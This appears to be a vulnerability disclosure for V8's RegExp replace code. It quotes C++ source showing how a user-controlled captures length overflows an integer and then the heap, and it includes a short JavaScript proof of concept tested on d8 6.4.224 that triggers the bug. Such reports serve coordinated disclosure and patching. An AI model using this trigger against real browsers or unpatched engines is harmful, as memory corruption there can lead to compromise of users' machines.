Here's a snippet of the method.
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
        isolate, captures_length_obj,
        Object::ToLength(isolate, captures_length_obj));
    const int captures_length = PositiveNumberToUint32(*captures_length_obj);
    ...
    if (functional_replace) {
      const int argc =
          has_named_captures ? captures_length + 3 : captures_length + 2; <<-- (a)

      ScopedVector<Handle<Object>> argv(argc);

      int cursor = 0;
      for (int j = 0; j < captures_length; j++) {
        argv[cursor++] = captures[j];
      }

      // (b)
      argv[cursor++] = handle(Smi::FromInt(position), isolate);
      argv[cursor++] = string;

The variable "captures_length" is user-controlled, so an integer overflow may occur at (a) which causes a heap overflow at (b).


PoC:
let cnt = 0;
let reg = /./g;
reg.exec = () => {
    if (cnt++ == 0)
        return {length: 0xfffffffe};

    cnt = 0;
    return null;
};

''.replace(reg, () => {});

Tested on d8 6.4.224.


This bug is subject to a 90 day disclosure deadline. After 90 days elapse
or a patch has been made broadly available, the bug report will become
visible to the public.
